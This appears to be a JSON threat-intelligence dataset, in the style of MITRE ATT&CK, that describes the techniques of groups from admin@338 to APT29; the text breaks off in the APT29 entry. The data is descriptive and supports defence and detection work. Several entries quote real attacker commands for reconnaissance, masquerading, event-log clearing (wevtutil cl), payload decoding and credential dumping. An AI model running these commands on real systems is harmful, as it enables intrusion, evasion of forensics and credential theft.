{
    "admin@338": "admin@338 is a China-based cyber threat group. It has previously used newsworthy events as lures to deliver malware and has primarily targeted organizations involved in financial, economic, and trade policy, typically using publicly available RATs such as PoisonIvy, as well as some non-public backdoors. , admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%/download net user /domain >> %temp%/download, Following exploitation with LOWBALL malware, admin@338 actors created a file containing a list of commands to be executed on the compromised computer., admin@338 has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158., admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:/ >> %temp%/download dir 'c:/Documents and Settings' >> %temp%/download dir 'c:/Program Files/' >> %temp%/download dir d:/ >> %temp%/download, admin@338 actors used the following command to rename one of their tools to a benign file name: ren '%temp%/upload' audiodg.exe, admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to list local groups: net localgroup administrator >> %temp%/download, admin@338 has sent emails with malicious Microsoft Office documents attached., admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%/download systeminfo >> %temp%/download, admin@338 actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%/download, admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to display network connections: netstat -ano >> %temp%/download, admin@338 actors used the following command following exploitation of a machine with LOWBALL malware to obtain information about services: net start >> %temp%/download, admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
    "Agrius": "Agrius is an Iranian threat actor active since 2020 notable for a series of ransomware and wiper operations in the Middle East, with an emphasis on Israeli targets. Public reporting has linked Agrius to Iran's Ministry of Intelligence and Security (MOIS)., , , , , Agrius typically uses commercial VPN services for anonymizing last-hop traffic to victim networks, such as ProtonVPN., Agrius used 7zip to archive extracted data in preparation for exfiltration., Agrius used a custom tool, sql.net4.exe, to query SQL databases and then identify and extract personally identifiable information., Agrius engaged in various brute forcing activities via SMB in victim environments., Agrius engaged in password spraying via SMB in victim environments., Agrius uses ASPXSpy web shells to enable follow-on command execution via cmd.exe., Agrius has deployed IPsec Helper malware post-exploitation and registered it as a service for persistence., Agrius gathered data from database and other critical servers in victim environments, then used wiping mechanisms as an anti-analysis and anti-forensics mechanism., Agrius has used the folder, C:/windows/temp/s/, to stage data for exfiltration., Agrius has deployed base64-encoded variants of ASPXSpy to evade detection., Agrius exfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers., Agrius exploits public-facing applications for initial access to victim environments. Examples include widespread attempts to exploit CVE-2018-13379 in FortiOS devices and SQL injection activity. , Agrius used several mechanisms to try to disable security tools. Agrius attempted to modify EDR-related services to disable auto-start on system reboot. Agrius used a publicly available driver, GMER64.sys typically used for anti-rootkit functionality, to selectively stop and remove security software processes., Agrius downloaded some payloads for follow-on execution from legitimate filesharing services such as ufile.io and easyupload.io., Agrius used the Plink tool for tunneling and connections to remote machines, renaming it systems.exe in some instances., Agrius used the open-source port scanner WinEggDrop to perform detailed scans of hosts of interest in victim networks., Agrius used tools such as Mimikatz to dump LSASS memory to capture credentials in victim environments., Agrius dumped the SAM file on victim machines to capture credentials., Agrius tunnels RDP traffic through deployed web shells to access victim environments via compromised accounts. Agrius used the Plink tool to tunnel RDP connections for remote access and lateral movement in victim environments., Agrius used the tool NBTscan to scan for remote, accessible hosts in victim environments., Agrius typically deploys a variant of the ASPXSpy web shell following initial access via exploitation., Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement.",
    "Ajax Security Team": "Ajax Security Team is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 Ajax Security Team transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies., Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between Ajax Security Team and the campaign Operation Woolen-Goldfish., , Analysis of infrastructure, tools, and modes of operation revealed a potential relationship between Ajax Security Team and Rocket Kitten., , , Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage., Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system., Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system., Ajax Security Team has used personalized spearphishing attachments., Ajax Security Team has used various social media channels to spearphish victims., Ajax Security Team has lured victims into executing malicious files.",
    "Akira": "Akira is a ransomware variant and ransomware deployment entity active since at least March 2023. Akira uses compromised credentials to access single-factor external access mechanisms such as VPNs for initial access, then various publicly-available tools and techniques for lateral movement. Akira operations are associated with 'double extortion' ransomware activity, where data is exfiltrated from victim environments prior to encryption, with threats to publish files if a ransom is not paid. Technical analysis of Akira ransomware indicates multiple overlaps with and similarities to Conti malware., , , Akira deletes administrator accounts in victim networks prior to encryption., Akira uses utilities such as WinRAR to archive data prior to exfiltration., Akira encrypts files in victim environments as part of ransomware operations., Akira has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity., Akira uses the built-in Nltest utility or tools such as AdFind to enumerate Active Directory trusts in victim environments. , Akira will exfiltrate victim data using applications such as Rclone., Akira uses compromised VPN accounts for initial access to victim networks., Akira engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom., Akira uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments., Akira uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks., Akira uses valid account information to remotely access victim networks, such as VPN credentials.",
    "ALLANITE": "ALLANITE is a suspected Russian cyber espionage group, that has primarily targeted the electric utility sector within the United States and United Kingdom. The group's tactics and techniques are reportedly similar to Dragonfly, although ALLANITEs technical capabilities have not exhibited disruptive or destructive abilities. It has been suggested that the group maintains a presence in ICS for the purpose of gaining understanding of processes and to maintain persistence. , ALLANITE leverages watering hole attacks to gain access into electric utilities. , ALLANITE has been identified to collect and distribute screenshots of ICS systems such as HMIs.  , ALLANITE utilized spear phishing to gain access into energy sector environments. , ALLANITE utilized credentials collected through phishing and watering hole attacks.",
    "Andariel": "Andariel is a North Korean state-sponsored threat group that has been active since at least 2009. Andariel has primarily focused its operations--which have included destructive attacks--against South Korean government agencies, military organizations, and a variety of domestic companies; they have also conducted cyber financial operations against ATMs, banks, and cryptocurrency exchanges. Andariel's notable activity includes Operation Black Mine, Operation GoldenAxe, and Campaign Rifle., Andariel is considered a sub-set of Lazarus Group, and has been attributed to North Korea's Reconnaissance General Bureau., North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name Lazarus Group instead of tracking clusters or subgroups., , , , Andariel has collected large numbers of files from compromised network systems for later extraction., Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range., Andariel has exploited numerous ActiveX vulnerabilities, including zero-days., Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data., Andariel has limited its watering hole attacks to specific IP address ranges., Andariel has downloaded additional tools and malware onto compromised hosts., Andariel has hidden malicious executables within PNG files., Andariel has used a variety of publicly-available remote access Trojans (RATs) for its operations., Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments., Andariel has used tasklist to enumerate processes and find a specific string., Andariel has used the netstat -naop tcp command to display TCP connections on a victim's machine., Andariel has attempted to lure victims into enabling malicious macros within email attachments.",
    "Aoqin Dragon": "Aoqin Dragon is a suspected Chinese cyber espionage threat group that has been active since at least 2013. Aoqin Dragon has primarily targeted government, education, and telecommunication organizations in Australia, Cambodia, Hong Kong, Singapore, and Vietnam. Security researchers noted a potential association between Aoqin Dragon and UNC94, based on malware, infrastructure, and targets., Aoqin Dragon has used custom malware, including Mongall and Heyoka Backdoor, in their operations., Aoqin Dragon has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems., Aoqin Dragon has run scripts to identify file formats including Microsoft Word., Aoqin Dragon has spread malware in target networks by copying modules to folders masquerading as removable devices., Aoqin Dragon has used fake icons including antivirus and external drives to disguise malicious payloads., Aoqin Dragon has used the Themida packer to obfuscate malicious payloads., Aoqin Dragon obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations., Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment., Aoqin Dragon has lured victims into opening weaponized documents, fake external drives, and fake antivirus to execute malicious payloads.",
    "APT-C-23": "APT-C-23 is a threat group that has been active since at least 2014. APT-C-23 has primarily focused its operations on the Middle East, including Israeli military assets. APT-C-23 has developed mobile spyware targeting Android and iOS devices since 2017., , , , ,  , , APT-C-23 has masqueraded malware as legitimate applications., APT-C-23 sends malicious links to victims to download the masqueraded application. , APT-C-23 can collect the victim’s phone number, device information, IMSI, etc.",
    "APT-C-36": "APT-C-36 is a suspected South America espionage group that has been active since at least 2018. The group mainly targets Colombian government institutions as well as important corporations in the financial sector, petroleum industry, and professional manufacturing., , APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening., APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened., APT-C-36 has disguised its scheduled tasks as those used by Google., APT-C-36 has used port 4050 for C2 communications., APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection., APT-C-36 obtained and used a modified variant of Imminent Monitor., APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway. , APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google., APT-C-36 has prompted victims to accept macros in order to execute the subsequent payload.",
    "APT1": "APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People’s Liberation Army (PLA) General Staff Department’s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. , , , , APT1 used the commands net localgroup,net user, and net group to find accounts on the system., APT1 has registered hundreds of domains for use in operations., APT1 has used RAR to compress files before moving them outside of the victim network., APT1 used a batch script to perform a series of discovery techniques and saves it to a text file., APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution., APT1 hijacked FQDNs associated with legitimate websites hosted by hop points., APT1 has collected files from a local victim., APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files., APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived., APT1 has created email accounts for later use in social engineering, phishing, and when registering domains., The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware., APT1 listed connected network shares., APT1 used publicly available malware for privilege escalation., APT1 has used various open-source tools for privilege escalation purposes., APT1 has been known to use credential dumping using Mimikatz., APT1 has sent spearphishing emails containing malicious attachments., APT1 has sent spearphishing emails containing hyperlinks to malicious files., APT1 gathered a list of running processes on the system using tasklist /v., The APT1 group is known to have used RDP during operations., APT1 used the ipconfig /all command to gather network configuration information., APT1 used the net use command to get a listing on network connections., APT1 used the commands net start and tasklist to get a listing of the services on the system., The APT1 group is known to have used pass the hash.",
    "APT12": "APT12 is a threat group that has been attributed to China. The group has targeted a variety of victims including but not limited to media outlets, high-tech companies, and multiple governments.,  ,  , , , APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port., APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611)., APT12 has sent emails with malicious Microsoft Office documents and PDFs attached., APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing., APT12 has used blogs and WordPress for C2 infrastructure.",
    "APT16": "APT16 is a China-based threat group that has launched spearphishing campaigns targeting Japanese and Taiwanese organizations. , APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads.",
    "APT17": "APT17 is a China-based threat group that has conducted network intrusions against U.S. government entities, the defense industry, law firms, information technology companies, mining companies, and non-government organizations. , , APT17 has created profile pages in Microsoft TechNet that were used as C2 infrastructure., APT17 has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, APT17 has created biographical sections and posted in forum threads.",
    "APT18": "APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. , , , , APT18 uses HTTP for C2 communications., APT18 uses DNS for C2 communications., APT18 establishes persistence via the HKCU/Software/Microsoft/Windows/CurrentVersion/Run key., APT18 uses cmd.exe to execute commands on the victim’s machine., APT18 actors leverage legitimate credentials to log into external remote services., APT18 can list files information for specific directories., APT18 actors deleted tools and batch files from victim systems., APT18 can upload a file to the victim’s machine., APT18 obfuscates strings in the payload., APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network., APT18 can collect system information from the victim’s machine., APT18 actors leverage legitimate credentials to log into external remote services.",
    "APT19": "APT19 is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms.  Some analysts track APT19 and Deep Panda as the same group, but it is unclear from open source information if the groups are the same.   , , , , , APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2., An APT19 HTTP malware variant establishes persistence by setting the Registry key HKCU/Software/Microsoft/Windows/CurrentVersion/Run/Windows Debug Tools-%LOCALAPPDATA%/., APT19 downloaded and launched code within a SCT file., APT19 used PowerShell commands to execute payloads., An APT19 Port 22 malware variant registers itself as a service., An APT19 HTTP malware variant used Base64 to encode communications to the C2 server., An APT19 HTTP malware variant decrypts strings using single-byte XOR keys., APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets., APT19 used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. , APT19 launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL., APT19 uses a Port 22 malware variant to modify several Registry keys., APT19 used Base64 to obfuscate executed commands., APT19 used Base64 to obfuscate payloads., APT19 has obtained and used publicly-available tools like Empire., APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits., APT19 used Regsvr32 to bypass application control techniques., APT19 configured its payload to inject into the rundll32.exe., APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine., APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine., APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username., APT19 attempted to get users to launch malicious attachments delivered via spearphishing emails.",
    "APT28": "APT28 is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165. This group has been active since at least 2004., APT28 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election. In 2018, the US indicted five GRU Unit 26165 officers associated with APT28 for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations. Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as Sandworm Team. , , , , , This designation has been used in reporting both to refer to the threat group and its associated malware JHUHUGIT., This designation has been used in reporting both to refer to the threat group and its associated malware.,  , , , , , , , , APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation., APT28 has used a Powershell cmdlet to grant the ApplicationImpersonation role to a compromised account., APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations., APT28 hosted phishing domains on free services for brief periods of time during campaigns., APT28 has used newly-created Blogspot pages for credential harvesting operations., APT28 has performed large-scale scans in an attempt to find vulnerable servers., APT28 has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware., Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration., APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims., APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks., APT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection., APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks., APT28 has deployed malware that has copied itself to the startup directory for persistence., An APT28 loader Trojan adds the Registry key HKCU/Environment/UserInitMprLogonScript to establish persistence., APT28 can perform brute force attacks to obtain credentials., APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks., APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks., APT28 downloads and executes PowerShell scripts and performs PowerShell commands., An APT28 loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads., APT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted., APT28 has used compromised email accounts to send credential phishing emails., APT28 compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages., APT28 has collected files from various information repositories., APT28 has collected information from Microsoft SharePoint services within target networks., APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration., APT28 has collected files from network shared drives., An APT28 backdoor may collect the entire contents of an inserted USB device., APT28 added 'junk data' to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a 'junk length' value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire., APT28 has stored captured credential information in a file named pi.log., APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server., APT28 has split archived exfiltration files into chunks smaller than 1MB., An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload., APT28 has compromised targets via strategic web compromise utilizing custom exploit kits. APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages., APT28 has collected emails from victim Microsoft Exchange servers., APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications., APT28 has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload., APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS., APT28 can exfiltrate data over Google Drive. , APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites., APT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution., APT28 has used CVE-2015-4902 to bypass security features., APT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges., APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement., APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts., APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms., APT28 has harvested user's login credentials., APT28 has saved files with hidden file attributes., APT28 has used the WindowStyle parameter to conceal PowerShell windows. , APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security., APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner., APT28 has performed timestomping on victim files., APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant., APT28 has used tools to perform keylogging., APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents., APT28 has renamed the WinRAR utility to avoid detection., APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page., In 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency., APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials., APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4., APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder., APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU/Software/Microsoft/Office test/Special/Perf to execute code., APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. , APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims. They have also dumped the LSASS process memory using the MiniDump function., APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access., APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim., APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments., APT28 has used spearphishing to compromise credentials., APT28 has conducted credential phishing campaigns with links that redirect to credential harvesting sites., APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy., An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions., APT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server., APT28 has routed traffic over Tor and VPN servers to obfuscate their activities., APT28 has mapped network drives using Net and administrator credentials., APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted., APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax., APT28 has used tools to take screenshots from victims., APT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server., APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as 'Google Defender' 'Google Email Protection,' and 'Google Scanner' for Gmail users. They also targeted Yahoo users with applications masquerading as 'Delivery Service' and 'McAfee Email Protection'., APT28 executed CHOPSTICK by using rundll32 commands such as rundll32.exe 'C:/Windows/twain_64.dll'. APT28 also executed a .dll for a first stage dropper using rundll32.exe. An APT28 loader Trojan saved a batch script that uses rundll32 to execute a DLL payload., APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. , Once APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network., APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail., APT28 has used pass the hash for lateral movement., APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders., APT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts., APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder., APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes., APT28 has used Google Drive for C2.",
    "APT29": "APT29 is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR). They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. APT29 reportedly compromised the Democratic National Committee starting in the summer of 2015., In April 2021, the US and UK governments attributed the SolarWinds Compromise to the SVR; public statements included citations to APT29, Cozy Bear, and The Dukes. Industry reporting also referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm., , , , , , , , , , , , , , , , , APT29 has bypassed UAC., During the SolarWinds Compromise, APT29 used PowerShell to discover domain accounts by exectuing Get-ADUser and Get-ADGroupMember., APT29 has conducted enumeration of Azure AD accounts., During the SolarWinds Compromise, APT29 added credentials to OAuth Applications and Service Principals., APT29 has used a compromised global administrator account in Azure AD to backdoor a service principal with ApplicationImpersonation rights to start collecting emails from targeted mailboxes; APT29 has also used compromised accounts holding ApplicationImpersonation rights in Exchange to collect emails.During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 added their own devices as allowed IDs for active sync using Set-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals., During the SolarWinds Compromise, APT29 granted company administrator privileges to a newly created service principle., APT29 has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command., During the SolarWinds Compromise, APT29 registered devices in order to enable mailbox syncing via the Set-CASMailbox command., For the SolarWinds Compromise, APT29 acquired C2 domains, sometimes through resellers.For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains., For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains., APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS. APT29 has also used legitimate web services such as Dropbox and Constant Contact in their operations., APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit., During the SolarWinds Compromise, APT29 used HTTP for C2 and data exfiltration., During the SolarWinds Compromise, APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; APT29 also compressed text files into zipped archives., APT29 added Registry Run keys to establish persistence., APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup., APT29 has installed a run command on a compromised system to enable malware execution on system startup., APT29 has successfully conducted password guessing attacks against a list of mailboxes., APT29 has conducted brute force password spray attacks., APT29 has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines., APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands., During the SolarWinds Compromise, APT29 used cmd.exe to execute commands on remote machines., For the SolarWinds Compromise, APT29 wrote malware such as Sibot in Visual Basic., APT29 has developed malware variants written in Python., APT29 has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API , APT29 has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts., APT29 has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments., For the SolarWinds Compromise, APT29 compromised domains to use for C2., APT29 can create new users through Azure AD., During the SolarWinds Compromise, APT29 stole users' saved passwords from Chrome., During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations., During the SolarWinds Compromise, APT29 downloaded source code from code repositories., APT29 has stolen data from compromised hosts.During the SolarWinds Compromise, APT29 extracted files from compromised networks., During the SolarWinds Compromise, APT29 extracted files from compromised networks., During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers., During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server., During the SolarWinds Compromise, APT29 used 7-Zip to decode their Raindrop malware., APT29 has used unique malware in many of their operations.For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP. For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke., For the SolarWinds Compromise, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP. , For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke., APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware., During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate., During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains., APT29 has used Dynamic DNS providers for their malware C2 infrastructure.During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2. , During the SolarWinds Compromise, APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2. , APT29 has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests.During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest., During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest., APT29 has used multiple layers of encryption within malware to protect C2 communication., For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes., APT29 has used WMI event subscriptions for persistence.During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe.During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware., During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe., During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware., APT29 used sticky-keys to obtain unauthenticated, privileged console access., During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers., APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network., During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network., APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution., APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host., APT29 has used compromised identities to access networks via VPNs and Citrix.For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools., For the SolarWinds 